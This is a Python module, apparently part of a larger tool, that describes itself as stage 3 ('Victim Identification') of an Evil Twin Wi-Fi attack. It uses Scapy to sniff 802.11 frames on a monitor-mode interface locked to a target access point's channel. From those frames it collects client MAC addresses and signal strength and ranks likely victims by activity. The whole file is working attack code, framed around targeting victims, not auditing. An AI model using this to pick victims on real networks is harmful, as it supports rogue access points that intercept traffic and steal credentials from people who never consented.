"""
client_discovery.py – Client (Victim) Discovery Module
--------------------------------------------------------
Listens for Data Frames and Management Frames on the target network.
Identifies active clients by collecting source MAC addresses that
communicate with the target BSSID.

Stage 3 of the Evil Twin attack: Victim Identification.
"""

import time
import threading
from scapy.all import sniff, Dot11, Dot11QoS, RadioTap


# ──────────────────────────────────────────────
# Data structure for a discovered client
# ──────────────────────────────────────────────

class Client:
    def __init__(self, mac: str, bssid: str):
        self.mac        = mac.upper()
        self.bssid      = bssid.upper()
        self.rssi       = -999
        self.pkt_count  = 0         # How many packets we've seen from this client
        self.last_seen  = time.time()

    def __repr__(self):
        return f"Client(mac={self.mac}, rssi={self.rssi}, pkts={self.pkt_count})"


# ──────────────────────────────────────────────
# Packet handler
# ──────────────────────────────────────────────

# Broadcast / multicast addresses to ignore
_IGNORE = {"FF:FF:FF:FF:FF:FF", "00:00:00:00:00:00"}

def _handle_packet(packet, target_bssid: str, clients: dict):
    """
    Called by Scapy for every sniffed packet.

    In 802.11 Data Frames there are up to 4 address fields:
      addr1 = Destination (receiver)
      addr2 = Source (transmitter)
      addr3 = BSSID
      addr4 = used only in WDS/mesh

    We look for frames where either:
      - addr1 == target_bssid  (AP → Client direction)
      - addr2 == target_bssid  (Client → AP direction, addr1 is client)
      - addr3 == target_bssid  (standard data frame)

    A client is any non-BSSID address we see communicating with our target AP.
    """
    if not packet.haslayer(Dot11):
        return

    dot11 = packet[Dot11]
    bssid = target_bssid.upper()

    addr1 = (dot11.addr1 or "").upper()
    addr2 = (dot11.addr2 or "").upper()
    addr3 = (dot11.addr3 or "").upper()

    # Only care about frames related to our target AP
    if bssid not in (addr1, addr2, addr3):
        return

    # The client MAC is whichever address is NOT the BSSID and not broadcast
    candidate = None
    if addr3 == bssid:
        # Standard data frame: addr1=destination, addr2=source
        # The "other" end talking to the AP
        for addr in (addr1, addr2):
            if addr != bssid and addr not in _IGNORE:
                candidate = addr
                break
    elif addr1 == bssid:
        candidate = addr2 if addr2 not in _IGNORE else None
    elif addr2 == bssid:
        candidate = addr1 if addr1 not in _IGNORE else None

    if candidate is None or candidate in _IGNORE:
        return

    # Update or create client entry
    if candidate not in clients:
        clients[candidate] = Client(mac=candidate, bssid=bssid)

    clients[candidate].pkt_count += 1
    clients[candidate].last_seen = time.time()

    # Update RSSI
    try:
        rssi = packet[RadioTap].dBm_AntSignal
        if rssi > clients[candidate].rssi:
            clients[candidate].rssi = rssi
    except Exception:
        pass


# ──────────────────────────────────────────────
# Public API
# ──────────────────────────────────────────────

def set_channel(iface: str, channel: int):
    """Lock the interface to the target AP's channel before sniffing."""
    import subprocess
    subprocess.run(
        ["iw", "dev", iface, "set", "channel", str(channel)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )


def discover_clients(iface: str, target_bssid: str, channel: int,
                     duration: int = 30) -> list[Client]:
    """
    Sniff for active clients on the target network.

    Args:
        iface:         Wireless interface in monitor mode
        target_bssid:  BSSID of the AP we're targeting
        channel:       Channel the AP operates on
        duration:      Seconds to listen (default 30s)

    Returns:
        List of Client objects sorted by packet count (most active first).
        More packets = more confident we have a real, active client.
    """
    # Lock to the AP's channel – no need to hop, we know where it is
    set_channel(iface, channel)

    clients = {}    # mac → Client

    sniff(
        iface=iface,
        prn=lambda pkt: _handle_packet(pkt, target_bssid, clients),
        timeout=duration,
        store=False
    )

    # Sort by activity – most active client first
    return sorted(clients.values(), key=lambda c: c.pkt_count, reverse=True)
